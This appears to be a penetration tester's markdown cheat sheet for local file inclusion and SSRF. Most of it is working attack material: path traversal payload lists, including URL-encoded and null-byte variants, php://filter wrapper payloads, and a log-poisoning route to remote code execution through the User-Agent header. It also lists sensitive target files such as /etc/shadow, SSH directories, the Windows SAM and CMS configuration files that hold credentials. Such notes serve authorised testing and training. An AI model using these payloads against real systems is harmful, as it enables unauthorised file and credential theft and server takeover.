## Places to look for [[SSRF]]
- Under templating engines
- Whenever, server allows a user to download a file.

## LFI with path traversal
- index.php?language=../../../../etc/passwd
- index.php?language=/../../../../etc/passwd
- Use same path first and then do path traversal
	1) Original request: 				"/usr/local/redacted/filename"
	2) Path traversal request:  	"/etc/passwd" -> bad request
	3) Path traversal request:  	"/user/local/../../etc/passwd" -> bad request
	4) Path traversal request:		"/user/local/redacted/../../../etc/passwd" -> OK


## Payloads
Bash also allows wildcards that can be used for path traversal
`.?/.*/.?/etc/passwd`

LFI payloads
```
../../../../../etc/passwd
/../../../../../etc/passwd
....//....//....//....//....//....//etc/passwd
//....//....//....//....//....//....//....//etc/passwd
../../../../../etc/passwd%000x00
/../../../../../etc/passwd%000x00
....//....//....//....//....//....//etc/passwd%000x00
//....//....//....//....//....//....//....//etc/passwd%000x00
%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2fetc%2fpasswd
%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2fetc%2fpasswd
%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd%000x00
%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd%000x00
%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2fetc%2fpasswd%000x00
%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2fetc%2fpasswd%000x00
```

## LFI with appended extensions
- Bypass using null-bytes
- If php is appended, the file requested would try to execute. We can use following php wrappers
```php
php://filter/read=convert.base64-encode/resource=flag
php://filter/read=string.rot13/resource=/etc/passwd
```

# RCE through Apache/nginx log files
## Path to log files
`/var/log/apache2/access.log`    Poison referer or User agent header
`/var/log/nginx/access.log` 
`/var/log/sshd.log`
`/var/log/mail`
`/var/log/vsftpd.log`
	
On older servers, the `/proc/self/environ` file can be included, which can be poisoned through the `User-Agent` string.

# Exploitation
Use file:///anything, check again with LFI

# POC files
## Linux
/etc/passwd 
/proc/self/cmdline
/etc/shadow 
/etc/issue 
/etc/group 
/etc/hostname 
/home/user/ 
/home/user/.ssh 
/home/user/bash_history

## Log files
/var/log/apache/access.log 
/var/log/apache2/access.log 
/var/log/httpd/access_log 
/var/log/apache/error.log 
/var/log/apache2/error.log 
/var/log/httpd/error_log

## CMS files
WordPress: /var/www/html/wp-config.php 
Joomla: /var/www/configuration.php 
Dolphin CMS: /var/www/html/inc/header.inc.php 
Drupal: /var/www/html/sites/default/settings.php 
Mambo: /var/www/configuration.php 
PHPNuke: /var/www/config.php

## Windows
c:\WINDOWS\system32\eula.txt c:\boot.ini 
c:\WINDOWS\win.ini 
c:\WINNT\win.ini 
c:\WINDOWS\Repair\SAM c:\WINDOWS\php.ini 
c:\WINNT\php.ini 
c:\Program Files\Apache Group\Apache\conf\httpd.conf

`More https://github.com/nixawk/fuzzdb/tree/master/attack/lfi`

### Nginx files
`/var/log/nginx/access.log` 
`/var/log/nginx/error.log`
`/etc/nginx/nginx.conf`
`/etc/nginx/sites-enabled/default`
`/etc/nginx/sites-available/default`